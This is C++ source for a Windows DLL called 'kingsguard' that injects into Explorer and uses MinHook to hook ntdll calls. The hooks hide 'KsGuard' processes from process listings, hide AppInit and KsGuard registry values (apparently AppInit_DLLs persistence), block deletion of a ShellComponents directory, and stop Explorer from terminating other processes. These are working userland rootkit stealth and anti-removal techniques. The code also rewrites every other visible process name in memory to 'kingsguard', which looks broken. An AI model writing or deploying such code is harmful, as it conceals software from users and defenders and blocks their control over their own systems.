#include "kingsguard.h"

pNtQuerySystemInformation OriginalNtQuerySystemInformation = nullptr;
pNtTerminateProcess OriginalNtTerminateProcess = nullptr;
pNtEnumerateValueKey OriginalNtEnumerateValueKey = nullptr;
pNtQueryValueKey OriginalNtQueryValueKey = nullptr;
pNtOpenFile OriginalNtOpenFile = nullptr;

NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, NT_KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
{
    if (ValueName->Length > 3)
    {
        std::wstring w_name = std::wstring(ValueName->Buffer);
        // std::transform(w_name.begin(), w_name.end(), ::tolower);
        if (w_name.find(L"Appinit") != std::wstring::npos || w_name.find(L"KsGuard") != std::wstring::npos)
            return STATUS_OBJECT_NAME_NOT_FOUND;
    }
    return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
}

NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
{
    NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

    if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
    {
        for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
        {
            status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

            std::wstring name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
            // std::transform(w_name.begin(), w_name.end(), ::tolower);
            if (name.find(L"AppInit") == std::wstring::npos && name.find(L"KsGuard") == std::wstring::npos)
            {
                newIndex++;
            }
        }
    }

    return status;
}

NTSTATUS WINAPI HookedNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions)
{
    if (DesiredAccess & DELETE && ObjectAttributes->ObjectName->Length > 1)
    {
        std::wstring w_name = std::wstring(ObjectAttributes->ObjectName->Buffer);
        // std::transform(w_name.begin(), w_name.end(), ::tolower);
        if (w_name.find(L"Windows\\ShellComponents") != std::wstring::npos) // no delete dir
            return STATUS_ACCESS_DENIED;
    }

    return OriginalNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
}

NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE hProcess, UINT code)
{
    OutputDebugStringA("in ntterminate");
    if (GetProcessId(GetCurrentProcess()) == GetProcessId(hProcess))
        return OriginalNtTerminateProcess(hProcess, code);

    return 1;
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        PMY_SYSTEM_PROCESS_INFORMATION prev = PMY_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        PMY_SYSTEM_PROCESS_INFORMATION curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

        while (prev->NextEntryOffset != 0)
        {
            std::wstring w_name = std::wstring(curr->ImageName.Buffer);
            if (w_name.find(L"KsGuard") != std::wstring::npos)
            {
                if (curr->NextEntryOffset == 0)
                    prev->NextEntryOffset = 0;
                else
                    prev->NextEntryOffset += curr->NextEntryOffset;
                curr = prev;
            }
            else
            {
                WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, L"kingsguard", curr->ImageName.Length, NULL);
            }
            prev = curr;
            curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }
    return status;
}

bool InstallHook()
{
    OutputDebugStringA("installing hooks");
    if (MH_Initialize() != MH_OK) { return false; }

    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID*>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID*>(&OriginalNtQuerySystemInformation)) != MH_OK) { return false; }
    if (MH_CreateHookApi(L"ntdll", "NtTerminateProcess", reinterpret_cast<LPVOID*>(&HookedNtTerminateProcess), reinterpret_cast<LPVOID*>(&OriginalNtTerminateProcess)) != MH_OK) { return false; }
    if (MH_CreateHookApi(L"ntdll", "NtEnumerateValueKey", reinterpret_cast<LPVOID*>(&HookedNtEnumerateValueKey), reinterpret_cast<LPVOID*>(&OriginalNtEnumerateValueKey)) != MH_OK) { return false; }
    if (MH_CreateHookApi(L"ntdll", "NtQueryValueKey", reinterpret_cast<LPVOID*>(&HookedNtQueryValueKey), reinterpret_cast<LPVOID*>(&OriginalNtQueryValueKey)) != MH_OK) { return false; }
    if (MH_CreateHookApi(L"ntdll", "NtOpenFile", reinterpret_cast<LPVOID*>(&HookedNtOpenFile), reinterpret_cast<LPVOID*>(&OriginalNtOpenFile)) != MH_OK) { return false; }

    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) { return false; }

    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (!IsExplorerProcess() || !InstallHook())
            return FALSE;
        OutputDebugStringA("hooks installed.");
        OutputDebugStringA(std::to_string(GetCurrentProcessId()).c_str());
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        MH_DisableHook(MH_ALL_HOOKS);
        break;
    }
    return TRUE;
}
